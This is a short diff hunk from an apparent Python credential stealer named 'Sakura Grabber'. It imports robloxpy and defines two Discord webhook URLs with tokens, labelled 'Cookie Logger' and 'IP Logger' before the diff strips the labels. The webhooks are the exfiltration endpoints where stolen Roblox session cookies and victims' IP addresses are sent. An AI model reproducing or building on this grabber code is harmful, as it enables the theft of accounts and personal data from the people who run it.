@@ -9,8 +9,8 @@ from tkinter import messagebox
 
 os.system("title Sakura Grabber")
 
-webhook = "https://discord.com/api/webhooks/1189564280144662548/-veKgExP-lbxIRuhmExS0ZGO6VDrtShlAE1D22T8fu7QVwyJa20O-8krbZLBk6AuRcDd - Cookie Logger"
-webhook1 = Webhook('https://discord.com/api/webhooks/1189564127958532187/l8LglZE8rFxYCzNhxxgieEIA93I2OdpSSrLbyfitQbTwyHuU8bvEF2QSPqLqRZeyDZJO - IP Logger')
+webhook = "https://discord.com/api/webhooks/1189564280144662548/-veKgExP-lbxIRuhmExS0ZGO6VDrtShlAE1D22T8fu7QVwyJa20O-8krbZLBk6AuRcDd"
+webhook1 = Webhook('https://discord.com/api/webhooks/1189564127958532187/l8LglZE8rFxYCzNhxxgieEIA93I2OdpSSrLbyfitQbTwyHuU8bvEF2QSPqLqRZeyDZJO')
 
 try:
     import robloxpy
